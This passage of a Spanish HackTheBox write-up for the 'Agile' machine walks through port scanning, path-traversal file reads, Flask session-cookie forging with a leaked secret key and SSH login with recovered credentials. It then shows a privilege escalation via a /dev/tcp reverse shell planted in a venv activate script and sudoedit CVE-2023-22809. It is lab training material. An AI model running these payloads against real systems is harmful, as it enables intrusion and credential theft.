include\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 lib\\nlrwxrwxrwx 1 root root         3 Jan 25 17:21 lib64 -> lib\\n-rw-rw-r-- 1 root root        70 Jan 25 17:21 pyvenv.cfg\\n\\n/app/venv/bin:\\ntotal 1380\\ndrwxrwxr-x 2 root dev_admin    4096 Mar 10 17:21 .\\ndrwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..\\n-rw-r--r-- 1 root dev_admin    9033 Mar 10 17:21 Activate.ps1\\n-rw-rw-r-- 1 root dev_admin    1976 Mar 10 17:21 activate\\n-rw-r--r-- 1 root dev_admin     902 Mar 10 17:21 activate.csh\\n-rw-r--r-- 1 root dev_admin    2044 Mar 10 17:21 activate.fish\\n-rwxrwxr-x 1 root root          213 Mar 10 17:21 flask\\n-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3.10\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 py.test\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pytest\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python -> python3\\nlrwxrwxrwx 1 root root           16 Mar 10 17:21 python3 -> /usr/bin/python3\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python3.10 -> python3\\n-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi\\nls: cannot open directory '/home/dev_admin': Permission denied\\n\\n~~~\\n\\nPara comprender mayormente el sistema revisamos el script test_and_update.sh\\n\\n~~~bash\\n#!/bin/bash\\n\\n# update prod with latest from testing constantly assuming tests are passing\\n\\necho \\\"Starting test_and_update\\\"\\ndate\\n\\n# if already running, exit\\nps auxww | grep -v \\\"grep\\\" | grep -q \\\"pytest\\\" && exit\\n\\necho \\\"Not already running. Starting...\\\"\\n\\n# start in dev folder\\ncd /app/app-testing\\n\\n# system-wide source doesn't seem to happen in cron jobs\\nsource /app/venv/bin/activate\\n\\n# run tests, exit if failure\\npytest -x 2>&1 >/dev/null || exit\\n\\n# tests good, update prod (flask debug mode will load it instantly)\\ncp -r superpass /app/app/\\necho \\\"Complete!\\\"\\n\\n~~~\\n\\nBásicamente lo que hace es validar la aplicación con un conjunto de pruebas, si estas prueabas son aprobadas, la aplicación es copiada en la carpeta /app y pasa a producción. Vemos que el script usa el archivo  /app/venv/bin/activate. Además, el usuario dev_admin tiene permisos de grupo para escribir sobre el.\\n\\nIntentaremos que el script source /app/venv/bin/activate quede de la siguiente forma (añadimos una shell reversa al final del script)\\n\\n~~~bash\\n# This file must be used with \\\"source bin/activate\\\" *from bash*\\n# you cannot run it directly\\n\\ndeactivate () {\\n    # reset old environment variables\\n    if [ -n \\\"${_OLD_VIRTUAL_PATH:-}\\\" ] ; then\\n        PATH=\\\"${_OLD_VIRTUAL_PATH:-}\\\"\\n        export PATH\\n        unset _OLD_VIRTUAL_PATH\\n    fi\\n    if [ -n \\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\" ] ; then\\n        PYTHONHOME=\\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\"\\n        export PYTHONHOME\\n        unset _OLD_VIRTUAL_PYTHONHOME\\n    fi\\n\\n    # This should detect bash and zsh, which have a hash command that must\\n    # be called to get it to forget past commands.  Without forgetting\\n    # past commands the $PATH changes we made may not be respected\\n    if [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n        hash -r 2> /dev/null\\n    fi\\n\\n    if [ -n \\\"${_OLD_VIRTUAL_PS1:-}\\\" ] ; then\\n        PS1=\\\"${_OLD_VIRTUAL_PS1:-}\\\"\\n        export PS1\\n        unset _OLD_VIRTUAL_PS1\\n    fi\\n\\n    unset VIRTUAL_ENV\\n    unset VIRTUAL_ENV_PROMPT\\n    if [ ! \\\"${1:-}\\\" = \\\"nondestructive\\\" ] ; then\\n    # Self destruct!\\n        unset -f deactivate\\n    fi\\n}\\n\\n# unset irrelevant variables\\ndeactivate nondestructive\\n\\nVIRTUAL_ENV=\\\"/app/venv\\\"\\nexport VIRTUAL_ENV\\n\\n_OLD_VIRTUAL_PATH=\\\"$PATH\\\"\\nPATH=\\\"$VIRTUAL_ENV/bin:$PATH\\\"\\nexport PATH\\n\\n# unset PYTHONHOME if set\\n# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)\\n# could use `if (set -u; : $PYTHONHOME) ;` in bash\\nif [ -n \\\"${PYTHONHOME:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PYTHONHOME=\\\"${PYTHONHOME:-}\\\"\\n    unset PYTHONHOME\\nfi\\n\\nif [ -z \\\"${VIRTUAL_ENV_DISABLE_PROMPT:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PS1=\\\"${PS1:-}\\\"\\n    PS1=\\\"(venv) ${PS1:-}\\\"\\n    export PS1\\n    VIRTUAL_ENV_PROMPT=\\\"(venv) \\\"\\n    export VIRTUAL_ENV_PROMPT\\nfi\\n\\n# This should detect bash and zsh, which have a hash command that must\\n# be called to get it to forget past commands.  Without forgetting\\n# past commands the $PATH changes we made may not be respected\\nif [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n    hash -r 2> /dev/null\\nfi\\n0<&196;exec 196<>/dev/tcp/10.10.14.118/4242; sh <&196 >&196 2>&196\\n\\n~~~\\n\\nVerificamos la versión de sudo\\n\\n![](/Agile/Pasted_image_20230311000023.png)\\n\\n## Elevación de Privilegios\\n\\nPara escalar privilegios usamos una vulnerabilidad de sudoedit, especificamente esta:\\n\\n[CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)\\n[Detalles de vulnerabilidad](https://www.openwall.com/lists/oss-security/2023/01/19/1)\\n\\nEn base al exploit creamos la siguiente variable de  entorno\\n\\n~~~bash\\nexport EDITOR=vim -- /app/venv/bin/activate\\n~~~\\n\\nLuego intentamos modificar el archivo creds.txt\\n\\n~~~bash\\nsudoedit -g dev_admin -u dev_admin /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nAgregamos la linea para nuestra reverse shell\\n\\n![](/Agile/Pasted_image_20230311000753.png)\\n\\nGuardamos\\n\\n![](/Agile/Pasted_image_20230311000618.png)\\n\\nUsamos netcat para esuchar alguna conexión en el puerto 4242 y esperamos unos minutos\\n\\n![](/Agile/Pasted_image_20230310235255.png)\\n\\nFinalmente obtenemos acceso al sistema como root\\n\",\"data\":{\"title\":\"HackTheBox - Maquina Agile\",\"subtitle\":\"Paso a paso de la explotación de la máquina Agile de HackTheBox.\",\"dificultad\":\"Medium\",\"os\":\"Sistema Operativo Linux\",\"date\":\"2024-02-10T00:00:00.000Z\",\"tags\":[\"HackTheBox\"]},\"content\":\"\\n## Enumeración de puertos\\n\\n### TCP \\n\\nEnumeracion de Puertos TCP\\n\\n~~~ bash\\nnmap -p- -A 10.129.30.106\\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:14 EST\\nNmap scan report for 10.129.30.106\\nHost is up (0.15s latency).\\nNot shown: 65533 closed tcp ports (conn-refused)\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)\\n|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)\\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\\n|_http-title: Did not follow redirect to http://superpass.htb\\n|_http-server-header: nginx/1.18.0 (Ubuntu)\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 502.76 seconds\\n~~~\\n\\n\\n\\n### UDP\\n  \\nEnumeración de puertos UDP\\n\\n~~~ bash\\nsudo nmap -F -sU 10.129.30.106\\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:32 EST\\nNmap scan report for agile.htb (10.129.30.106)\\nHost is up (0.15s latency).\\nNot shown: 99 closed udp ports (port-unreach)\\nPORT   STATE         SERVICE\\n68/udp open|filtered dhcpc\\n\\nNmap done: 1 IP address (1 host up) scanned in 106.72 seconds\\n~~~\\n\\n\\n## Enumeracion de Servicios     \\n\\n### Puerto 80\\n\\nDefinimos el subdominio superpass.htb (este es visible en el título de la página de Nginx, tambien visible en los resultados de nmap)\\n\\n![](/Agile/Pasted_image_20230306113515.png)\\n\\nIntentamos registrarnos en la aplicacion web\\n\\n![](/Agile/Pasted_image_20230306114025.png)\\n\\nAl intentarlo obtenemos el siguiente error\\n\\n![](/Agile/Pasted_image_20230306113616.png)\\n\\nLuego de registrarnos ingresamos a la siguiente página\\n\\nPodemos ingresar algunas credenciales al baul.Intentamos exportarlas\\n\\nLuego intentamos extraer archivos interesantes de información, como el archivo (etc/passwd)\\n\\n~~~http\\nGET /download?fn=../../etc/passwd HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 14:51:57 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 1744\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\npollinate:x:105:1::/var/cache/pollinate:/bin/false\\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\\nusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\ncorum:x:1000:1000:corum:/home/corum:/bin/bash\\ndnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\\nmysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false\\nrunner:x:1001:1001::/app/app-testing/:/bin/sh\\nedwards:x:1002:1002::/home/edwards:/bin/bash\\ndev_admin:x:1003:1003::/home/dev_admin:/bin/bash\\n_laurel:x:999:999::/var/log/laurel:/bin/false\\n~~~\\n\\nConsultamos las variables de entorno del sistema\\n\\n~~~http\\nGET /download?fn=../../proc/self/environ HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n![](/Agile/Pasted_image_20230306121100.png)\\n\\nBuscamos el directorio /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../home/dev_admin/app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\nNo tenemos acceso al archivo pero encontramos un campo llamado secret en la respuesta\\n\\n~~~http\\nHTTP/1.1 500 INTERNAL SERVER ERROR\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:15:35 GMT\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 13637\\nConnection: close\\n\\n<!doctype html>\\n<html lang=en>\\n  <head>\\n    <title>PermissionError: [Errno 13] Permission denied: '/tmp/../../home/dev_admin/app/config_prod.json'\\n // Werkzeug Debugger</title>\\n    <link rel=\\\"stylesheet\\\" href=\\\"?__debugger__=yes&amp;cmd=res&amp;f=style.css\\\">\\n    <link rel=\\\"shortcut icon\\\"\\n        href=\\\"?__debugger__=yes&amp;cmd=res&amp;f=console.png\\\">\\n    <script src=\\\"?__debugger__=yes&amp;cmd=res&amp;f=debugger.js\\\"></script>\\n    <script>\\n      var CONSOLE_MODE = false,\\n          EVALEX = true,\\n          EVALEX_TRUSTED = false,\\n          SECRET = \\\"0k71JQ5bp0qM5tHnQe0w\\\";\\n    </script>\\n  </head>\\n~~~\\n\\nDatos del archivo hosts\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:03 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 253\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n127.0.0.1 localhost superpass.htb test.superpass.htb\\n127.0.1.1 agile\\n\\n# The following lines are desirable for IPv6 capable hosts\\n::1     ip6-localhost ip6-loopback\\nfe00::0 ip6-localnet\\nff00::0 ip6-mcastprefix\\nff02::1 ip6-allnodes\\nff02::2 ip6-allrouters\\n~~~\\n\\nArchivo /etc/mysql/my.cnf\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:05 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 682\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n#\\n# The MySQL database server configuration file.\\n#\\n# You can copy this to one of:\\n# - \\\"/etc/mysql/my.cnf\\\" to set global options,\\n# - \\\"~/.my.cnf\\\" to set user-specific options.\\n# \\n# One can use all long options that the program supports.\\n# Run program with --help to get a list of available options and with\\n# --print-defaults to see which it would actually understand and use.\\n#\\n# For explanations see\\n# http://dev.mysql.com/doc/mysql/en/server-system-variables.html\\n\\n#\\n# * IMPORTANT: Additional settings that can override those from this file!\\n#   The files must end with '.cnf', otherwise they'll be ignored.\\n#\\n\\n!includedir /etc/mysql/conf.d/\\n!includedir /etc/mysql/mysql.conf.d/\\n~~~\\n\\nKernel versión\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:08 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 184\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nLinux version 5.15.0-60-generic (buildd@lcy02-amd64-054) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023\\n~~~\\n\\n\\nNginx error log\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:51 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 82947\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n2023/02/28 16:21:17 [error] 1004#1004: *14 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n2023/02/28 16:23:58 [error] 1004#1004: *18 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n\\n~~~\\n\\nConsultamos el archivo  /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~ bash\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 17:15:30 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 88\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n{\\\"SQL_URI\\\": \\\"mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass\\\"}\\n~~~\\n\\nCódigo fuente de app.py\\n\\n~~~http\\nGET /download?fn=../../app/app/superpass/app.py HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~python\\n\\nimport json\\nimport os\\nimport sys\\nimport flask\\nimport jinja_partials\\nfrom flask_login import LoginManager\\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))\\nfrom superpass.infrastructure.view_modifiers import response\\nfrom superpass.data import db_session\\n\\napp = flask.Flask(__name__)\\napp.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'\\n\\n\\ndef register_blueprints():\\n    from superpass.views import home_views\\n    from superpass.views import vault_views\\n    from superpass.views import account_views\\n    \\n    app.register_blueprint(home_views.blueprint)\\n    app.register_blueprint(vault_views.blueprint)\\n    app.register_blueprint(account_views.blueprint)\\n\\n\\ndef setup_db():\\n    db_session.global_init(app.config['SQL_URI'])\\n\\n\\ndef configure_login_manager():\\n    login_manager = LoginManager()\\n    login_manager.login_view = 'account.login_get'\\n    login_manager.init_app(app)\\n\\n    from superpass.data.user import User\\n\\n    @login_manager.user_loader\\n    def load_user(user_id):\\n        from superpass.services.user_service import get_user_by_id\\n        return get_user_by_id(user_id)\\n\\n\\ndef configure_template_options():\\n    jinja_partials.register_extensions(app)\\n    helpers = {\\n        'len': len,\\n        'str': str,\\n        'type': type,\\n    }\\n    app.jinja_env.globals.update(**helpers)\\n\\n\\ndef load_config():\\n    config_path = os.getenv(\\\"CONFIG_PATH\\\")\\n    with open(config_path, 'r') as f:\\n        for k, v in json.load(f).items():\\n            app.config[k] = v\\n\\n\\ndef configure():\\n    load_config()\\n    register_blueprints()\\n    configure_login_manager()\\n    setup_db()\\n    configure_template_options()\\n\\n\\ndef enable_debug():\\n    from werkzeug.debug import DebuggedApplication\\n    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)\\n    app.debug = True\\n\\n\\ndef main():\\n    enable_debug()\\n    configure()\\n    app.run(debug=True)\\n\\n\\ndef dev():\\n    configure()\\n    app.run(port=5555)\\n\\n\\nif __name__ == '__main__':\\n    main()\\nelse:\\n    configure()\\n\\n~~~\\n\\nUsamos el secret_key para extraer la información de la cookie del usuario\\n\\nCredenciales encontradas\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vEF5_-9daSA.ZAYqgQ.Zvh6p_nlvHTv1LtEwEhcdp-rjUo\\n~~~\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '9'}\\n~~~\\n\\nCreamos nuestra propia session\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\n~~~\\n\\nEl comando a usar es:\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\n![](/Agile/Pasted_image_20230306150725.png)\\n\\nLuego lo intentamos con el  \\\\_user_id: 2\\n\\n![](/Agile/Pasted_image_20230306150956.png)\\n\\nUsers:\\n\\n~~~bash\\ncorum\\nrunner\\nedwards\\ndev_admin\\nsuperpassuser\\n~~~\\n\\nPasswords:\\n\\n~~~bash\\nMNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD\\ndSA6l7q*yIVs$39Ml6ywvgK\\n0k71JQ5bp0qM5tHnQe0w\\n~~~\\n\\n~~~text\\n0xdf:762b430d32eea2f12970\\n0xdf:5b133f7a6a1c180646cb\\ncorum:47ed1e73c955de230a1d\\ncorum:9799588839ed0f98c211\\ncorum:5db7caa1d13cc37c9fc2\\n~~~\\n\\n## Getting a shell\\n\\nIntentamos acceder a través de SSH con las credenciales del usuario Corum\\n\\n~~~ bash\\nssh corum@10.129.30.106\\n~~~\\n\\n![](/Agile/Pasted_image_20230306155037.png)\\n\\n### System Enumeration\\n\\nProcesos interesantes\\n\\n![](/Agile/Pasted_image_20230306160615.png)\\n\\nArchivos interesantes\\n\\n~~~bash\\n/var/www/html/index.nginx-debian.html                                                                                                                                                 